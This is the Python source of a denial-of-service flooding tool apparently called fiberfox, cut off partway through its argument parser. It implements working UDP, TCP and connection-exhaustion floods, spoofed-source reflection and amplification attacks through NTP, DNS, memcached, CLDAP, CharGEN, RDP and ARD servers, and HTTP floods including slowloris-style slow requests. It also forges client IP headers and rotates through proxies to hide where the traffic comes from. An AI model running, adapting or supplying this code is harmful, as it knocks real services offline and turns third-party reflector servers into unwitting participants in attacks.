#!/usr/bin/env python3

from argparse import ArgumentParser, Namespace
import asks
from certifi import where
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor
from contextlib import suppress, asynccontextmanager
import curio
from curio import ssl, socket
from dataclasses import dataclass, field
import dns
import dns.resolver
from functools import partial
import json
from impacket.ImpactPacket import Data, IP, UDP
from itertools import cycle
from logging import basicConfig, getLogger
from math import log2, trunc
from pathlib import Path
from python_socks import ProxyTimeoutError
from python_socks.async_.curio import Proxy
from random import choice, randint, randrange
import re
import requests
import socket as syncsocket
from sparklines import sparklines
import string
from struct import pack
from tabulate import tabulate
import time
from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple, Union
from yarl import URL
from urllib import parse
from urllib.request import urlopen

from fiberfox.static import USERAGENTS, REFERERS

try:
    from random import randbytes
except ImportError:
    from os import urandom
    randbytes = urandom

# fix issue with pthread_cancel for Python3.7/8
try:
    import ctypes
    libgcc_s = ctypes.CDLL('libgcc_s.so.1')
except OSError:
    pass


# todo:
# * fix historgram tracker, fix rate calculator, split incoming/outgoing
# * stats: better numbers, list of errors
# * run as a package "python -m fiberfox", programmatic launch


basicConfig(format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S")


Dest = Tuple[str, int]
PacketData = Tuple[bytes, Dest]


PROTOCOLS = {"tcp", "http", "https", "udp", "socks4", "socks5"}
RE_IPPORT = re.compile("^((?:\d+.){3}\d+):(\d{1,5})$")


SSL_CTX: ssl.SSLContext = ssl.create_default_context(cafile=where())
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE
# to deal with changes to default ciphers in Python3.10+
# https://bugs.python.org/issue43998
SSL_CTX.set_ciphers("DEFAULT")


ERR_NO_BUFFER_AVAILABLE = 55


# on receive this error, the proxy should be removed from the pool
IRRECOVERABLE_PROXY_ERRORS: List[str] = [
    "407 Proxy Authentication Required",
    "Invalid proxy response",
    "Unexpected SOCKS version number",
]


DNS_RESOLVER = dns.resolver.Resolver(configure=False)
DNS_RESOLVER.nameservers = [
    "1.1.1.1",
    "1.0.0.1",
    "8.8.8.8",
    "8.8.4.4",
    "208.67.222.222",
    "208.67.220.220"
]


# xxx(okachaiev): we can make resolve of all hosts faster using thread pool
def resolve_host(host: str) -> str:
    if dns.inet.is_address(host): return host
    return DNS_RESOLVER.resolve(host)[0].to_text()


# xxx(okachaiev): try out "hummanize" package
def humanbytes(i: int, binary: bool = False, precision: int = 2):
    multiplies = [
        "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
    ]
    if i == 0: return f"-- B"
    base = 1024 if binary else 1000
    multiple = trunc(log2(i) / log2(base))
    value = i / pow(base, multiple)
    suffix = multiplies[multiple].format("i" if binary else "")
    return f"{value:.{precision}f} {suffix}"


@dataclass
class Target:

    protocol: str
    addr: str
    port: int
    url: Optional[URL] = None
    
    @classmethod
    def from_string(cls, target: str, resolve_addr:bool = True) -> "Target":
        url = URL(target)
        if not url.scheme or url.scheme not in PROTOCOLS:
            url = URL(f"tcp://{target}")
        # the configuration is only setup in the beginning
        # so there's no need we are completely fine doing this synchronosly
        addr = resolve_host(url.host) if resolve_addr else url.host
        return cls(protocol=url.scheme.lower(), addr=addr, port=int(url.port or 80), url=url)

    @property
    def ssl_context(self) -> Optional[ssl.SSLContext]:
        if self.protocol != "https" and self.port != 443: return None
        return SSL_CTX


def load_file(filepath: str) -> str:
    local_path = Path(filepath)
    if local_path.is_file():
        return local_path.read_text()

    url = URL(filepath)
    if url.scheme in {"http", "https"}:
        with urlopen(filepath) as f:
            return f.read().decode()

    raise ValueError(f"Cannot open {filepath}")


def load_file_lines(path: str) -> Generator[str, None, None]:
    content = load_file(path)
    for line in content.splitlines():
        if line.strip():
            yield line.strip()


def load_targets_config(path: str, pool_size: int = 0) -> List[Target]:
    lines =  load_file_lines(path)
    if pool_size == 0:
        return list(map(Target.from_string, lines))
    else:
        with ThreadPoolExecutor(max_workers=pool_size) as executor:
            return list(executor.map(Target.from_string, lines))


def proxy_type_to_protocol(proxy_type: Union[int, str]) -> str:
    if proxy_type == 4: return "socks4"
    if proxy_type == 5: return "socks5"
    if isinstance(proxy_type, int): return "http"
    if proxy_type.lower() == "socks4": return "socks4"
    if proxy_type.lower() == "socks5": return "socks5"
    return "http"


async def load_from_provider(ctx: "Context", provider, proxies: List[str]) -> None:
    proto = proxy_type_to_protocol(provider["type"])
    ctx.logger.info(f"Loading proxies from url={provider['url']} type={proto}")
    try:
        response = await asks.get(provider["url"], timeout=provider["timeout"])
    except Exception as e:
        ctx.track_error(f"Proxy provider error: {provider['url']} {e}")
        return
    if response.status_code != 200: return
    for line in response.text.splitlines():
        match = RE_IPPORT.search(line)
        if match:
            proxies.append(f"{proto}://{match.group(1)}:{match.group(2)}")


async def try_connect_proxy(
    ctx: "Context",
    proxy_url: str,
    timeout_seconds: int,
    proxies: List[str]
) -> None:
    proxy = Proxy.from_url(proxy_url)
    try:
        conn = await curio.timeout_after(
            timeout_seconds,
            curio.open_connection(proxy.proxy_host, proxy.proxy_port, source_addr=("0.0.0.0", 0)))
        await conn.close()
    except Exception as e:
        ctx.track_error(f"Proxy conn error: {proxy_url} {e}")
    else:
        proxies.append(proxy_url)


class ProxySet:

    def __init__(self, proxies: List[str], is_empty: bool = False):
        self._proxies = set(proxies)
        self._dead_proxies: Dict[str, int] = {}
        self._is_empty = is_empty

    def __len__(self) -> int:
        return len(self._proxies)

    def __next__(self) -> Tuple[str, Proxy]:
        url = choice(list(self._proxies))
        return (url, Proxy.from_url(url))

    # xxx(okachaiev): now we can re-try after some time
    def mark_dead(self, proxy_url: str) -> "ProxySet":
        self._proxies.discard(proxy_url)
        self._dead_proxies[proxy_url] = time.time()
        return self

    def __str__(self):
        num_alive, num_dead = len(self), len(self._dead_proxies)
        if num_alive + num_dead == 0:
            return "ProxySet[empty]"
        else:
            ratio = 100*num_alive/(num_alive + num_dead)
            return f"ProxySet[{num_alive}/{num_alive+num_dead} {ratio:0.2f}%]"

    def human_repr(self):
        return "" if self._is_empty else str(self)

    @classmethod
    def empty(cls) -> "ProxySet":
        return cls(proxies=[], is_empty=True)

    @classmethod
    def from_list(cls, proxies: List[str]) -> "ProxySet":
        return cls(proxies=[p.strip() for p in proxies if p.strip()])

    @classmethod
    def from_file(cls, path: Union[str, Path]) -> "ProxySet":
        content = load_file(path)
        return cls.from_list(content.splitlines())

    @classmethod
    async def from_providers(cls, ctx: "Context", providers: List[Any]) -> "ProxySet":
        proxies = []
        async with curio.TaskGroup() as g:
            for provider in providers:
                await g.spawn(load_from_provider, ctx, provider, proxies)
        alive_proxies = []
        timeout_seconds = 5
        if proxies:
            async with curio.TaskGroup() as g:
                for proxy_url in proxies:
                    await g.spawn(
                        try_connect_proxy, ctx, proxy_url, timeout_seconds, alive_proxies)
        return cls(proxies=alive_proxies)

    @classmethod
    def from_providers_config(cls, ctx: "Context", path: str) -> "ProxySet":
        content = load_file(path)
        providers = json.loads(content)["proxy-providers"]
        return cls.from_providers(ctx, providers)


class Stats:
    def __init__(self, hist_buckets: int = 10, hist_max: int = 1024):
        self.total_bytes_sent: int = 0
        self.total_elapsed_seconds: int = 0
        self.packets_sent: int = 0
        self._hist_buckets: int = hist_buckets
        self._hist_max: int = hist_max
        self.current_session: Dict[int, int] = defaultdict(int)
        # the last bucket is dedicated for 100% succesfull execution only
        self.packets_per_session: List[int] = [0]*(self._hist_buckets+1)
        self.num_sessions: int = 0

    def track_packet_sent(self, fid: int, size: int, elapsed_seconds: int = 0) -> None:
        self.total_bytes_sent += size
        self.total_elapsed_seconds += elapsed_seconds
        self.packets_sent += 1
        if self._hist_buckets > 0:
            self.current_session[fid] += 1

    def start_session(self, fid: Optional[int] = None) -> None:
        self.num_sessions += 1

    def reset_session(self, fid: int) -> None:
        if self._hist_buckets > 0:
            packets_sent = self.current_session[fid]
            bucket = int(self._hist_buckets*packets_sent/self._hist_max)
            try: 
                self.packets_per_session[bucket] += packets_sent
            except IndexError:
                # xxx(okachaiev): fix this later
                pass
            self.current_session[fid] = 0


class Context:
    def __init__(
        self,
        *,
        args: Namespace,
        targets: List[Target],
        strategy: Callable[["Context", int, Target], None],
        proxies: Optional[ProxySet] = None,
        reflectors: Optional[List[str]] = None,
        num_fibers: int = 20,
        packet_size: int = 1024,
        rpc: int = 1000,
        duration_seconds: int = 10,
        connection_timeout_seconds: int = 10,
        log_level: str = "INFO",
    ):
        self.args = args
        self.targets = targets
        self.targets_iter = cycle(targets)
        self.strategy = strategy
        self.proxies = proxies
        self.reflectors = reflectors
        self.num_fibers = num_fibers
        self.packet_size = packet_size
        self.rpc = rpc
        self.duration_seconds = duration_seconds
        self.connection_timeout_seconds = connection_timeout_seconds
        
        hist_buckets = 10 if rpc >= 10 else 0 # no need to track hist if RPC is small
        self.stats: Dict[URL, Stats] = defaultdict(lambda: Stats(hist_max=rpc))
        self.num_errors: int = 0
        self.errors: deque = deque([], maxlen=100)
        self.logger = getLogger("fiberfox")
        self.logger.setLevel(log_level.upper())

    @property
    def connection_timeout(self):
        return min(self.connection_timeout_seconds, self.duration_seconds)

    def track_packet_sent(
        self,
        fid: int,
        target: Target,
        size: int,
        elapsed_seconds: int = 0
    ) -> None:
        if size > 0:
            self.stats[target.url].track_packet_sent(fid, size, elapsed_seconds)

    def start_session(self, fid: int, target: Target) -> None:
        self.stats[target.url].start_session(fid)

    def reset_session(self, fid: int, target: Target) -> None:
        self.stats[target.url].reset_session(fid)

    def track_error(self, exc: Union[Exception, str]) -> None:
        self.logger.debug(exc)
        self.num_errors += 1
        self.errors.append(str(exc))

    @classmethod
    def from_args(cls, args: Namespace) -> "Context":
        targets = []
        if args.targets_config is not None:
            targets.extend(load_targets_config(args.targets_config, pool_size=10))
        targets.extend(Target.from_string(t.strip()) for t in args.targets or [])
        rfs = list(load_file_lines(args.reflectors_config)) if args.reflectors_config else []
        return cls(
            args=args,
            targets=targets,
            num_fibers=args.concurrency,
            strategy=args.strategy,
            reflectors=rfs,
            rpc=args.rpc,
            packet_size=args.packet_size,
            duration_seconds=args.duration_seconds,
            log_level=args.log_level,
            connection_timeout_seconds=args.connection_timeout_seconds,
        )


useragents: List[str] = USERAGENTS.splitlines(False)
referers: List[str] = REFERERS.splitlines(False)


def spoof_ip_headers(target: Target) -> List[str]:
    spoof: str = syncsocket.inet_ntoa(pack('>I', randint(1, 0xffffffff)))
    return [
        "X-Forwarded-Proto: http",
        f"X-Forwarded-Host: {target.url.raw_host}, 1.1.1.1",
        f"Via: {spoof}",
        f"Client-IP: {spoof}",
        f"X-Forwarded-For: {spoof}",
        f"Real-IP: {spoof}"
    ]


def spoof_ip(target: Target) -> str:
    return "\r\n".join(spoof_ip_headers(target))


# xxx(okachaiev): would be good to have a library to manage encodings only
def http_req_get(target: Target) -> bytes:
    return (
        f"GET {target.url.raw_path_qs} HTTP/1.1\r\n"
        f"Host: {target.url.authority}\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Accept: */*\r\n"
        f"{spoof_ip(target)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode()


def http_req_payload(
        target: Target,
        req_type: str = "GET",
        req: Optional[List[str]] = None
    ) -> bytes:
    version = choice(["1.1", "1.2"])
    user_agent = choice(useragents)
    referer = choice(referers) + parse.quote(target.url.human_repr())
    parts = [
        f"{req_type} {target.url.raw_path_qs} HTTP/{version}",
        f"Host: {target.url.authority}",
        f"User-Agent: {user_agent}",
        f"Referrer: {referer}",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: en-US,en;q=0.9",
        "Cache-Control: max-age=0",
        "Connection: Keep-Alive",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "Sec-Fetch-User: 1",
        "Sec-Gpc: 1",
        "Pragma: no-cache",
        spoof_ip(target)
    ]
    if req:
        parts += req
    return ("\r\n".join(parts) + "\r\n\r\n").encode()


def rand_str(size: int) -> str:
    return "".join(choice(string.ascii_letters) for _ in range(size)) 


async def connect_via_proxy(ctx: Context, proxy: Proxy, target: Target):
    conn = await proxy.connect(target.addr, target.port, timeout=ctx.connection_timeout)
    if target.ssl_context is not None:
        conn = await target.ssl_context.wrap_socket(
            conn, do_handshake_on_connect=True, server_hostname=None)
    return conn


class TcpConnection:
    """Hopefully, one day, this implementation will make flood _v2
    more convenient than the first version. But I need to make it
    work first.
    """

    def __init__(self, ctx: Context, target: Target):
        self._ctx: Context = ctx
        self._target: Target = target
        self._sock = None
        self._proxy_url: Optional[str] = None
        self._packet_sent: bool = False

    @property
    def sock(self):
        return self._sock

    def mark_packet_sent(self):
        self._packet_sent = True

    async def __aenter__(self):
        if self._ctx.proxies:
            self._proxy_url, proxy = next(self._ctx.proxies)
            conn = connect_via_proxy(self._ctx, proxy, self._target)
        else:
            conn = curio.open_connection(
                self._target.addr, self._target.port, ssl=self._target.ssl_context)
        try:
            self._sock = await curio.timeout_after(self._ctx.connection_timeout, conn)
        except Exception as e:
            pass
        return self

    async def __aexit__(self, exc_t, exc_v, exc_tb):
        if exc_t:
            if isinstance(exc_v, curio.errors.TaskCancelled):
                return True
            print(exc_t, exc_v, isinstance(exc_t, curio.errors.TaskCancelled))
        if self._sock:
            await self._sock.close()
        if self._proxy_url and not self._packet_sent:
            self._ctx.proxies.mark_dead(self._proxy_url)
        return True


async def flood_packets_gen_v2(ctx, fid, target, packets):
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            stream = conn.sock.as_stream()
            async for payload in packets:
                conn.mark_packet_sent()
                ctx.track_packet_sent(fid, target, len(payload))


async def flood_packets_gen(
    ctx: Context,
    fid: int,
    target: Target,
    packets: Generator[bytes, None, None]
):
    packet_sent, stream, proxy_url, proxy = 0, None, None, None
    try:
        if ctx.proxies:
            proxy_url, proxy = next(ctx.proxies)
            conn = connect_via_proxy(ctx, proxy, target)
        else:
            conn = curio.timeout_after(
                ctx.connection_timeout,
                curio.open_connection(target.addr, target.port, ssl=target.ssl_context))
        conn = await conn
        stream = conn.as_stream()
        async with curio.meta.finalize(packets) as packets:
            async for payload in packets:
                # not the most accurate time measure
                start = time.time()
                await stream.write(payload)
                ctx.track_packet_sent(fid, target, len(payload), time.time()-start)
                packet_sent += 1
    except curio.TaskTimeout:
        # xxx(okachaiev): how to differentiate proxy connection vs. target connection?
        # if the target is dead, we should not remove proxy from the pool
        ctx.track_error(f"Connection timeout proxy={proxy_url} target={target.url}")
        if proxy_url:
            ctx.proxies.mark_dead(proxy_url)
        return 0
    except ProxyTimeoutError as e:
        # xxx(okachaiev): how to differentiate proxy connection vs. target connection?
        # if the target is dead, we should not remove proxy from the pool
        ctx.track_error(e)
        # xxx(okachaiev): do this only when happened multiple times
        # ctx.proxies.mark_dead(proxy_url)
    except Exception as e:
        for error in IRRECOVERABLE_PROXY_ERRORS:
            if error in str(e):
                ctx.track_error(f"Proxy error: proxy={proxy_url} target={target.url} {e}")
                return packet_sent
        return packet_sent
    finally:
        if stream:
            await stream.close()
        if proxy:
            await proxy._close()
    return packet_sent


async def flood_ampl_packates_gen(
    ctx: Context,
    fid: int,
    target: Target,
    packets: Generator[PacketData, None, None]
):
    async with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) as sock:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        async with curio.meta.finalize(packets) as packets:
            async for (payload, dest) in packets:
                try:
                    now = time.time()
                    sent = await sock.sendto(payload, dest)
                    ctx.track_packet_sent(fid, target, len(payload), time.time()-now)
                    if sent == 0: return
                except OSError as exc:
                    if exc.errno == ERR_NO_BUFFER_AVAILABLE:
                        # typically this happens when there are too many fibers
                        # which is not necessary for UDP traffic
                        await curio.sleep(1)
                    else:
                        ctx.track_error(exc)
                        return


async def UDP(ctx: Context, fid: int, target: Target):
    """Sends randomly generated UDP packets to the target (UDP port).

    Layer: L4.

    Automatically throttles fiber on receiving NO_BUFFER_AVAILABLE from the
    network device. To prevent this from happening do not configure more than
    2 fibers per target when testing UDP flood attack.
    """
    async with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        running = True
        while running:
            try:
                sent = await sock.sendto(randbytes(ctx.packet_size), (target.addr, target.port))
                ctx.track_packet_sent(fid, target, sent)
                running = sent > 0
            except OSError as exc:
                if exc.errno == ERR_NO_BUFFER_AVAILABLE:
                    # typically this happens when there are too many fibers
                    # which is not necessary for UDP traffic
                    await curio.sleep(1)
                else:
                    running = False
                    ctx.track_error(exc)




def ampl_packets_gen(
    reflectors: List[str],
    target: Target,
    payload: bytes,
    ampl_port: int
) -> Generator[PacketData, None, None]:
    def gen():
        for ref in reflectors:
            packet = IP()
            packet.set_ip_src(target.addr)
            packet.set_ip_dst(ref)

            content = UDP()
            content.set_uh_dport(ampl_port)
            content.set_uh_sport(target.port)
            content.contains(Data(payload))
        
            packet.contains(content)
            yield packet.get_packet(), (ref, ampl_port)

    return cycle(gen())


async def RDP(ctx: Context, fid: int, target: Target):
    """Leverages Windows RDP servers to launch amplication attack.

    Layer: L4.

    Requires list of reflection servers to be provided.
    """
    packets = ampl_packets_gen(
        ctx.reflectors,
        target,
        b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
        3389
    )
    await flood_ampl_packates_gen(ctx, fid, target, packets)


async def CLDAP(ctx: Context, fid: int, target: Target):
    """Amplication (reflection) attack against Connection-less Lightweight
    Directory Access Protocol (CLDAP). More information and analysis:
    https://www.akamai.com/our-thinking/threat-advisories/cldap-reflection-ddos

    Layer: L4.

    Requires list of reflection servers to be provided.
    """
    packets = ampl_packets_gen(
        ctx.reflectors,
        target,
        b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
        b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
        389
    )
    await flood_ampl_packates_gen(ctx, fid, target, packets)


async def MEMCACHED(ctx: Context, fid: int, target: Target):
    """Amplification (reflection) attack against memcached protocol. Protocol spec:
    https://github.com/memcached/memcached/blob/master/doc/protocol.txt

    Attack vector analysis:
    https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/

    Layer: L4.

    Requires list of reflection servers to be provided.
    """
    packets = ampl_packets_gen(
        ctx.reflectors,
        target,
        b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n',
        11211
    )
    await flood_ampl_packates_gen(ctx, fid, target, packets)


async def CHAR(ctx: Context, fid: int, target: Target):
    """Leverages Character Generator Protocol (CharGEN) to launch amplification
    (reflection) attack.

    Layer: L4.

    Requires list of reflection servers to be provided.
    """
    packets = ampl_packets_gen(ctx.reflectors, target, b'\x01', 19)
    await flood_ampl_packates_gen(ctx, fid, target, packets)


async def ARD(ctx: Context, fid: int, target: Target):
    """Leverages MacOS Apple Remote Desktop (ARD) service to launch amplification
    (reflection) attack.

    Layer: L4.

    Requires list of reflection servers to be provided.
    """
    packets = ampl_packets_gen(
        ctx.reflectors,
        target,
        b'\x00\x14\x00\x00',
        3283
    )
    await flood_ampl_packates_gen(ctx, fid, target, packets)


async def NTP(ctx: Context, fid: int, target: Target):
    """NTP amplification (reflection) attack. More info:
    https://www.cisa.gov/uscert/ncas/alerts/TA14-013A

    Layer: L4.

    Requires list of reflection servers to be provided.
    """
    packets = ampl_packets_gen(
        ctx.reflectors,
        target,
        b'\x17\x00\x03\x2a\x00\x00\x00\x00',
        123
    )
    await flood_ampl_packates_gen(ctx, fid, target, packets)


async def DNS(ctx: Context, fid: int, target: Target):
    """DNS amplification (reflection) attack. More info:
    https://www.cisa.gov/uscert/ncas/alerts/TA13-088A
    
    Layer: L4.

    Requires list of reflection servers to be provided.
    """
    packets = ampl_packets_gen(
        ctx.reflectors,
        target,
        b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
        b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
        53
    )
    await flood_ampl_packates_gen(ctx, fid, target, packets)


async def TCP(ctx: Context, fid: int, target: Target):
    """Simple flood: sends RPC randomly generated TCP packets into an open TCP connection.

    Layer: L4.

    Supports configuration for the size of a single packet and the number of packets
    to be sent into each open connection.
    """
    async def gen():
        for _ in range(ctx.rpc):
            yield randbytes(ctx.packet_size)

    await flood_packets_gen(ctx, fid, target, gen())


async def GET(ctx: Context, fid: int, target: Target):
    """Sends randomly generated HTTP GET requests over an open TCP connection.

    Layer: L7.

    Does not require 200 OK HTTP response code (as it doesn't consume response at all).
    Though attack performed against load balancer or WAF might not be effective
    (compared to L4 TCP flood).
    """
    async def gen():
        req: bytes = http_req_get(target)
        for _ in range(ctx.rpc):
            yield req

    await flood_packets_gen(ctx, fid, target, gen())


async def STRESS(ctx: Context, fid: int, target: Target):
    """Sends a sequence of HTTP requests with a large body over a single open TCP connection.
    
    Layer: L7.

    To maximize performance, make sure that the target host allows pipelining
    (sending a new request within a persistent connection without reading the
    response first). Does not require 200 OK HTTP response code (as it doesn't
    consume the response at all). Though attack performed against load balancer
    or WAF might not be effective (compared to L4 TCP flood).
    """
    async def gen():
        for _ in range(ctx.rpc):
            req = [
                f"Content-Length: {ctx.packet_size+12}",
                "X-Requested-With: XMLHttpRequest",
                "Content-Type: application/json\r\n",
                '{"data": %s}' % rand_str(ctx.packet_size)
            ]
            yield http_req_payload(target, "POST", req)
    
    await flood_packets_gen(ctx, fid, target, gen())


async def BYPASS(ctx: Context, fid: int, target: Target):
    """Sends HTTP get requests over an open TCP connection, reads response back.

    Layer: L7.

    Chunked reading is performed by `recv` bytes from the connection,
    without parsing into HTTP response.
    """
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            for _ in range(ctx.rpc):
                req, chunks = http_req_get(target), []
                now = time.time()
                bytes_sent = await conn.sock.sendall(req)
                elapsed = time.time() - now
                if bytes_sent is None or bytes_sent == len(req):
                    while True:
                        chunk = await conn.sock.recv(1024)
                        if not chunk:
                            break
                        chunks.append(chunk)
                else:
                    ctx.logger.error(f"connection closed: {bytes_sent}/{len(req)}")
                total_size = (bytes_sent or 0) + sum(map(len, chunks))
                ctx.track_packet_sent(fid, target,  total_size, elapsed)


async def CONNECTION(ctx: Context, fid: int, target: Target):
    """Opens TCP connections and keeps them alive as long as possible.

    Layer: L4.

    To be effective, this type of attack requires a higher number of fibers
    than usual. Note that modern servers are pretty good at handling open
    inactive connections.
    """
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            conn.mark_packet_sent()
            while await conn.sock.recv(1):
                ctx.track_packet_sent(fid, target, 1)


# xxx(okachaiev): configuration for time delay
async def SLOW(ctx: Context, fid: int, target: Target):
    """Similarly to STRESS, issues HTTP requests and attempts to keep
    connection utilized by reading back a single byte and sending additional
    payload with time delays between send operations.

    Layer: L7.

    Ideally, time delay should be set up properly to avoid connection being
    reset by the peer because of read timeout (depends on peer setup).
    """
    # xxx(okachaiev): should this be generated randomly each time?
    req: bytes = http_req_payload(target, "GET")
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            for _ in range(ctx.rpc):
                now = time.time()
                bytes_sent = await conn.sock.sendall(req)
                elapsed = time.time() - now
                ctx.track_packet_sent(fid, target, bytes_sent or 0, elapsed)
            while True:
                now = time.time()
                bytes_sent = await conn.sock.sendall(req)
                elapsed = time.time() - now
                if bytes_sent is not None and bytes_sent < len(req):
                    break
                await conn.sock.recv(1)
                header = f"X-a: {randint(1,5000)}\r\n".encode()
                now = time.time()
                header_bytes_sent = await conn.sock.sendall(header)
                elapsed += time.time() - now
                # xxx(okachaiev): this will overflow as we are sending too many
                # requests here (infinitely more than RPC). need to find a wayt
                # to track this properly
                total_size = (bytes_sent or 0) + (header_bytes_sent or 0)
                ctx.track_packet_sent(fid, target, total_size, elapsed)
                await curio.sleep(ctx.rpc/1) # xxx(okachaiev): too long?


# xxx(okachaiev): configuration for delay and for timeout
async def CFBUAM(ctx: Context, fid: int, target: Target):
    """Sends a single HTTP GET, after a long delay issues more requests
    over the same TCP connection.

    Layer: L7.
    """
    # xxx(okachaiev): should this be generated randomly each time?
    req: bytes = http_req_payload(target, "GET")
    async with TcpConnection(ctx, target) as conn:
        if conn.sock:
            now = time.time()
            bytes_sent = await conn.sock.sendall(req)
            elapsed = time.time() - now
            ctx.track_packet_sent(fid, target, bytes_sent or 0, elapsed)
            if bytes_sent is not None and bytes_sent < len(req): return
            await curio.sleep(5.01)
            with curio.ignore_after(120):
                for _ in range(ctx.rpc):
                    now = time.time()
                    bytes_sent = await conn.sock.sendall(req)
                    elapsed = time.time() - now
                    if bytes_sent is not None and bytes_sent < len(req): return
                    ctx.track_packet_sent(fid, target, bytes_sent or 0, elapsed)


# xxx(okachaiev): flexible delay configuration
async def AVB(ctx: Context, fid: int, target: Target):
    """Issues HTTP GET packets into an open connection with long delays
    between send operations. To avoid the connection being reset by the
    peer because of read timeout, the maximum delay is set to 1 second.

    Layer: L7.
    """
    async def gen():
        # xxx(okachaiev): should this payload be randomized on each cycle?
        req: bytes = http_req_payload(target, "GET")
        for _ in range(ctx.rpc):
            await curio.sleep(max(ctx.rpc/1000, 1))
            yield req

    await flood_packets_gen(ctx, fid, target, gen())


async def DGB(ctx: Context, fid: int, target: Target):
    """Sends a single HTTP GET request, copies cookie values from the
    response. After that issues RPC additional GET requests with a delay
    between them. The response is properly consumed from the network.

    Layer: L7.

    Implementational note: MHDDoS impl. uses Session object from
    the Python's requests package that does not guarantee reuse of
    underlying TCP connection. Which means HTTP-layer attach would
    work even if the target server does not support persistent re-usable
    connections.
    """
    pass


async def flood_fiber(ctx: Context, fid: int, target: Target):
    ctx.start_session(fid, target)
    # run a flood session (for TCP connections this would typically mean
    # sending RPC number of packets)
    await ctx.strategy(ctx, fid, target)
    # resetting session is only used stats tracking (per session packets hist)
    # xxx(okachaiev): this might be done as context manager with "ContextSession"
    ctx.reset_session(fid, target)


async def flood_fiber_loop(ctx: Context, fid: int):
    while True:
        target = next(ctx.targets_iter)
        await flood_fiber(ctx, fid, target)


async def load_proxies(ctx: Context):
    if ctx.args.proxies:
        proxy_set = ProxySet.from_list(ctx.args.proxies)
    elif ctx.args.proxies_config:
        proxy_set = ProxySet.from_file(ctx.args.proxies_config)
    elif ctx.args.proxy_providers_config:
        print(f"==> Loading proxy servers from providers")
        # xxx(okachaiev): cache into file
        proxy_set = await ProxySet.from_providers_config(ctx, ctx.args.proxy_providers_config)
    else:
        proxy_set = ProxySet.empty()
    if proxy_set:
        print(f"☂ Loaded {len(proxy_set)} proxies")
    ctx.proxies = proxy_set


async def flood(ctx: Context):
    # xxx(okachaiev): periodically reload
    await load_proxies(ctx)

    group = curio.TaskGroup()
    print(f"==> Launching {ctx.num_fibers} fibers "
          f"to test {len(ctx.targets)} targets for {ctx.duration_seconds}s")
    for fid in range(ctx.num_fibers):
        await group.spawn(flood_fiber_loop, ctx, fid)

    started_at = time.time()
    while time.time() < started_at + ctx.duration_seconds:
        await curio.sleep(10)
        show_stats(ctx, time.time()-started_at)

    print("==> Initializing shutdown...")
    timeout = object()
    terminted = await curio.ignore_after(10, group.cancel_remaining(), timeout_result=timeout)
    if terminted is timeout:
        ctx.logger.warning("Shutdown timeout, forcing termination")
    await group.join()

    end_at = time.time()
    show_final_stats(ctx, end_at-started_at, sign="🥃")


def show_stats(ctx: Context, elapsed_seconds: int, sign="🦊"):
    for target in ctx.targets:
        total_bytes_sent = ctx.stats[target.url].total_bytes_sent
        total_elapsed_seconds = ctx.stats[target.url].total_elapsed_seconds
        bytes_sent_repr = humanbytes(total_bytes_sent, True)
        if total_elapsed_seconds == 0:
            rate = "--"
        else:
            rate = humanbytes(total_bytes_sent/total_elapsed_seconds, True)
        progress = 100*elapsed_seconds/ctx.duration_seconds
        ctx.logger.info(
            f"{sign} {target.url}\t{progress:0.2f}%\t"
            f"Sent {bytes_sent_repr} in {elapsed_seconds:0.2f}s ({rate}ps)\t"
            f"{ctx.proxies.human_repr()}")


def show_final_stats(ctx: Context, elapsed_seconds: int, sign=""):
    rows = []
    for target in ctx.targets:
        total_bytes_sent = ctx.stats[target.url].total_bytes_sent
        total_elapsed_seconds = ctx.stats[target.url].total_elapsed_seconds
        bytes_sent_repr = humanbytes(total_bytes_sent, True)
        if total_elapsed_seconds == 0:
            rate = "--"
        else:
            rate = humanbytes(total_bytes_sent/total_elapsed_seconds, True)
        buckets = ctx.stats[target.url].packets_per_session
        rows.append([
            target.url,
            ctx.stats[target.url].num_sessions,
            ctx.stats[target.url].packets_sent,
            bytes_sent_repr,
            rate+"/s",
            "\n".join(sparklines(buckets)) if sum(buckets) > 0 else "n/a",
        ])
    print(
        f"{sign} Time spent: {elapsed_seconds:0.2f}s, "
        f"errors registered: {ctx.num_errors}. "
        f"Enjoy the results:")
    print(tabulate(
        rows, headers=["Target", "Sessions", "Packets", "Traffic", "Rate (Out)", "Quality"]))


default_strategies = {
    # L4
    "udp": UDP,
    "tcp": TCP,
    "connection": CONNECTION,
    # AMPL
    "rdp": RDP,
    "cldap": CLDAP,
    "memcached": MEMCACHED,
    "mem": MEMCACHED,
    "char": CHAR,
    "ard": ARD,
    "ntp": NTP,
    "dns": DNS,
    # L7
    "stress": STRESS,
    "bypass": BYPASS,
    "slow": SLOW,
    "cfbuam": CFBUAM,
    "avb": AVB,
    "get": GET,
}


def parse_args(available_strategies):
    parser = ArgumentParser()
    parser.add_argument(
        "--targets",
        nargs="*",
        help="List of targets, separated by spaces (if many)"
    )
    parser.add_argument(
        "--targets-config",
        type=str,
        default=None,
